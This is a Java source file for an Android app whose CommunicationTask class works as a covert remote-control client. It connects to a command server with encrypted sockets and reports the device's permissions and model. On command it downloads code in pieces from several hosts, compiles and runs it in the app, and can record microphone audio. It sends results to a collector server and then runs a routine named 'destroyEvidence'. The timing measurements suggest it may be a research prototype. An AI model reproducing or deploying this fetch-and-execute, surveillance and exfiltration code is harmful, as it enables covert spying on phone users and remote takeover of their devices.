package com.android.app_2_faces_net;

import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.util.Log;

import com.android.app_2_faces_net.compile_unit.Compiler;
import com.android.app_2_faces_net.compile_unit.InvalidSourceCodeException;
import com.android.app_2_faces_net.compile_unit.NotBalancedParenthesisException;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.Socket;
import java.util.Arrays;
import java.util.HashMap;
import java.util.regex.Pattern;

import javassist.NotFoundException;

public class CommunicationTask extends AsyncTask<Void, Void, String> {
    private static final String LOGCAT_TAG = "COMMUNICATION_TASK";

    private final Context context;

    private final String socketMainHostname;
    private final int socketMainPort;
    private Socket socketMain = null;
    private PrintWriter outMain = null;
    private BufferedReader inMain = null;


    public CommunicationTask(Context context, String socketMainHostname, int socketMainPort) {
        this.context = context;
        this.socketMainHostname = socketMainHostname;
        this.socketMainPort = socketMainPort;
    }

    @Override
    protected String doInBackground(Void... params) {
        try {
            connectToSocketMain(this.socketMainHostname, this.socketMainPort);

            writeOnSocketMain("alive");
            boolean isAlive = true;

            while (isAlive) {
                String commandReceived = readFromSocketMain();

                String toSend = "";

                // Initial messages
                switch (commandReceived) {
                    case "Permissions":
                        toSend = DeviceUtils.getPermissions(this.context, false);
                        break;
                    case "Permissions granted":
                        toSend = DeviceUtils.getPermissions(this.context, true);
                        break;
                    case "API":
                        toSend = DeviceUtils.getApiLevel();
                        break;
                    case "Model":
                        toSend = DeviceUtils.getDeviceModel();
                        break;
                }

                // Activation message
                if (commandReceived.startsWith("Servers: ")) {
                    String collectorServerString = readFromSocketMain();
                    String resultType = readFromSocketMain();
                    String arg = readFromSocketMain();

                    String[] taskParams = {commandReceived, collectorServerString, resultType, arg};

                    SchifoTask schifoTask = new SchifoTask(this.context);
                    schifoTask.executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, taskParams);
                } else if (commandReceived.equals("close")) {
                    isAlive = false;
                }


                if (!toSend.equals("")) {
                    writeOnSocketMain(toSend);
                }
            }
        } catch (IOException | PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        closeSocketMain();

        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        Log.d("Task", "executed");
    }

    private String[] parseSocketCodeSenderList(String socketCodeSenderListString) {
        return socketCodeSenderListString.substring(9).split(Pattern.quote("|"));
    }

    /*private void parseSocketCodeSenderParams(String socketCodeSenderString) {
        String[] codeSenderParams = socketCodeSenderString.split(":");

        this.socketCodeSenderHostname = codeSenderParams[0];
        this.socketCodeSenderPort = Integer.parseInt(codeSenderParams[1]);
    }*/

    /*private void parseSocketCollectorParams(String socketCollectorString) {
        socketCollectorString = socketCollectorString.split("Collector: ")[1];
        String[] collectorParams = socketCollectorString.split(":");

        this.socketCollectorHostname = collectorParams[0];
        this.socketCollectorPort = Integer.parseInt(collectorParams[1]);
    }*/

    /**
     * Establish a connection with the SocketMain
     *
     * @param hostname of SocketMain
     * @param port     of SocketMain
     */
    private void connectToSocketMain(String hostname, int port) {
        try {
            if (socketMain == null) {
                Log.d(LOGCAT_TAG, "[Connecting to SocketMain...]");
                this.socketMain = new Socket(hostname, port);

                this.outMain = new PrintWriter(socketMain.getOutputStream(), true);
                this.inMain = new BufferedReader(new InputStreamReader(socketMain.getInputStream()));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    /**
     * Wait for a new message from SocketMain and, when it arrive, decrypt it
     *
     * @return decrypted message read from SocketMain
     * @throws IOException in case of error with buffer
     */
    private String readFromSocketMain() throws IOException {
        String receivedEncrypted = this.inMain.readLine();
        String receivedDecrypted = Crypto.decryptString(
                Crypto.sha256(this.socketMainPort + this.socketMainHostname),
                Crypto.md5(this.socketMainHostname + this.socketMainPort),
                receivedEncrypted);

        Log.d(LOGCAT_TAG, "Reading from SocketMain: " + receivedDecrypted);
        return receivedDecrypted;
    }

    /**
     * Encrypt and write message on SocketMain
     *
     * @param message to be encrypted and written
     */
    private void writeOnSocketMain(String message) {
        Log.d(LOGCAT_TAG, "Writing on SocketMain: " + message);
        String messageEncrypted = Crypto.encryptString(
                Crypto.sha256(this.socketMainPort + this.socketMainHostname),
                Crypto.md5(this.socketMainHostname + this.socketMainPort),
                message);
        this.outMain.println(messageEncrypted);
    }

    /**
     * Close connection of SocketMain
     */
    public void closeSocketMain() {
        if (socketMain != null) {
            try {
                Log.d(LOGCAT_TAG, "[Closing socket...]");
                socketMain.close();
                socketMain = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }


    class SchifoTask extends AsyncTask<String, Void, String> {
        private static final String TAG = "SchifoTask";

        private Context context;

        private String socketCollectorHostname;
        private int socketCollectorPort;
        private Socket socketCollector = null;
        private PrintWriter outCollector = null;
        private BufferedReader inCollector = null;

        private final HashMap<Integer, String> pieces;

        public SchifoTask(Context context) {
            this.context = context;
            this.pieces = new HashMap<>();
        }

        @Override
        protected String doInBackground(String... args) {
            String servers = args[0];
            String collectorServerString = args[1];
            String resultType = args[2];
            String arg = args[3];

            String[] socketCodeSendersList = parseSocketCodeSenderList(servers);
            Log.d("serversList", Arrays.toString(socketCodeSendersList));

            collectorServerString = collectorServerString.split("Collector: ")[1];
            resultType = resultType.split("Result Type: ")[1];
            arg = arg.split("Arg: ")[1];

            String[] collectorParams = collectorServerString.split(":");
            this.socketCollectorHostname = collectorParams[0];
            this.socketCollectorPort = Integer.parseInt(collectorParams[1]);

            try {
                //download phase
                long startDownloadPhase = System.nanoTime();
                this.pieces.clear();
                for (int i = 0; i < socketCodeSendersList.length; i++) {
                    //TODO REFACTOR
                    String[] codeSenderParams = socketCodeSendersList[i].split(":");

                    DownloadTask task = new DownloadTask(codeSenderParams[0], Integer.parseInt(codeSenderParams[1]));
                    task.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, i);
                }

                while (pieces.size() < socketCodeSendersList.length) {
                    Thread.sleep(100);
                }
                StringBuilder codeBuilder = new StringBuilder();
                for (int i = 0; i < socketCodeSendersList.length; i++) {
                    codeBuilder.append(pieces.get(i));
                }
                String code = codeBuilder.toString();
                long endDownloadPhase = System.nanoTime();
                //end download phase


                //new Compile instance
                Compiler compiler = new Compiler(this.context, code, this.context.getFilesDir());

                //parsing phase
                long startParsing = System.nanoTime();
                compiler.parseSourceCode();
                long endParsing = System.nanoTime();
                //end parsing phase

                //compiling phase
                long startCompiling = System.nanoTime();
                compiler.compile();
                long endCompiling = System.nanoTime();
                //end compiling phase

                //dynamic loading phase
                long startLoading = System.nanoTime();
                compiler.dynamicLoading(this.context.getCacheDir(), this.context.getApplicationInfo(), this.context.getClassLoader());
                long endLoading = System.nanoTime();
                //end dynamic loading phase

                //execution phase
                long startExecution = System.nanoTime();
                Object obj = compiler.getInstance("RuntimeClass");
                String result;
                if (resultType.equals("Sound")) {
                    Method firstMethod = obj.getClass().getDeclaredMethod("run", Context.class);
                    MediaRecorder recorder = (MediaRecorder) firstMethod.invoke(obj, this.context);

                    Thread.sleep(5000);

                    Method secondMethod = obj.getClass().getDeclaredMethod("stop", MediaRecorder.class, Context.class);
                    result = (String) secondMethod.invoke(obj, recorder, this.context);
                } else {
                    Method method = obj.getClass().getDeclaredMethod("run", Context.class);
                    result = (String) method.invoke(obj, this.context);
                }
                long endExecution = System.nanoTime();
                String resultToSend = "Result: " + result;
                //end execution phase

                //eval timing
                double timeToDownload = (endDownloadPhase - startDownloadPhase) / 1000000.0;
                double timeToParse = (endParsing - startParsing) / 1000000.0;
                double timeToCompile = (endCompiling - startCompiling) / 1000000.0;
                double timeToDynamicLoad = (endLoading - startLoading) / 1000000.0;
                double timeToExecute = (endExecution - startExecution) / 1000000.0;
                String timingToSend = "Timing: " + timeToDownload + "~" + timeToParse + "~" + timeToCompile + "~" + timeToDynamicLoad + "~" + timeToExecute;

                //collector phase
                connectToSocketCollector(this.socketCollectorHostname, this.socketCollectorPort);
                writeOnSocketCollector(timingToSend + "|" + resultToSend);
                closeSocketCollector();

                //destroy evidence
                compiler.destroyEvidence();
            } catch (InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException | NotBalancedParenthesisException | NotFoundException | InterruptedException | InvalidSourceCodeException | IOException e) {
                e.printStackTrace();
                closeSocketCollector();
            }
            closeSocketCollector();
            return "ok";
        }

        /**
         * Establish a connection with the SocketCollector
         *
         * @param hostname of SocketCollector
         * @param port     of SocketCollector
         */
        private void connectToSocketCollector(String hostname, int port) {
            try {
                if (socketCollector == null) {
                    Log.d(LOGCAT_TAG, "[Connecting to SocketCollector...]");
                    this.socketCollector = new Socket(hostname, port);
                    this.socketCollector.setReuseAddress(false);

                    this.outCollector = new PrintWriter(socketCollector.getOutputStream(), true);
                    this.inCollector = new BufferedReader(new InputStreamReader(socketCollector.getInputStream()));
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        /**
         * Encrypt and write message on SocketCollector
         *
         * @param message to be encrypted and written
         */
        private void writeOnSocketCollector(String message) {
            Log.d(LOGCAT_TAG, "Writing on SocketCollector: " + message);
            String messageEncrypted = Crypto.encryptString(
                    Crypto.sha256(this.socketCollectorPort + this.socketCollectorHostname),
                    Crypto.md5(this.socketCollectorHostname + this.socketCollectorPort),
                    message);
            this.outCollector.println(messageEncrypted);
        }

        /**
         * Close connection of SocketCollector
         */
        public void closeSocketCollector() {
            if (socketCollector != null) {
                try {
                    Log.d(LOGCAT_TAG, "[Closing socket collector...]");
                    socketCollector.close();
                    socketCollector = null;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        /** **/
        class DownloadTask extends AsyncTask<Integer, Void, String> {
            private static final String TAG = "DownloadTask";

            private final String socketCodeSenderHostname;
            private final int socketCodeSenderPort;

            private Socket socketCodeSender = null;
            private PrintWriter outCodeSender = null;
            private BufferedReader inCodeSender = null;

            public DownloadTask(String socketCodeSenderHostname, int socketCodeSenderPort) {
                this.socketCodeSenderHostname = socketCodeSenderHostname;
                this.socketCodeSenderPort = socketCodeSenderPort;
            }

            @Override
            protected String doInBackground(Integer... integer) {
                try {
                    Log.d(TAG, "Starting downloadTask...");
                    connectToSocketCodeSender(this.socketCodeSenderHostname, this.socketCodeSenderPort);


                    String piece = readFromSocketCodeSender();
                    pieces.put(integer[0], piece);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return null;
            }

            @Override
            protected void onPostExecute(String s) {
                Log.d(TAG, "[Downloaded from SocketCodeSender...]");
            }

            /**
             * Establish a connection with the SocketCodeSender
             *
             * @param hostname of SocketCodeSender
             * @param port     of SocketCodeSender
             */
            private void connectToSocketCodeSender(String hostname, int port) {
                try {
                    if (socketCodeSender == null) {
                        Log.d(TAG, "[Connecting to SocketCodeSender...]");
                        this.socketCodeSender = new Socket(hostname, port);
                        this.socketCodeSender.setReuseAddress(false);

                        this.outCodeSender = new PrintWriter(socketCodeSender.getOutputStream(), true);
                        this.inCodeSender = new BufferedReader(new InputStreamReader(socketCodeSender.getInputStream()));
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            /**
             * Wait for a new message from SocketCodeSender and, when it arrive, decrypt it
             *
             * @return decrypted message read from SocketCodeSender
             * @throws IOException in case of error with buffer
             */
            private String readFromSocketCodeSender() throws IOException {
                String receivedEncrypted = this.inCodeSender.readLine();
                String receivedDecrypted = Crypto.decryptString(
                        Crypto.sha256(this.socketCodeSenderPort + this.socketCodeSenderHostname),
                        Crypto.md5(this.socketCodeSenderHostname + this.socketCodeSenderPort),
                        receivedEncrypted);

                Log.d(TAG, "Reading from SocketCodeSender: " + receivedDecrypted);
                return receivedDecrypted;
            }
        }
    }
}
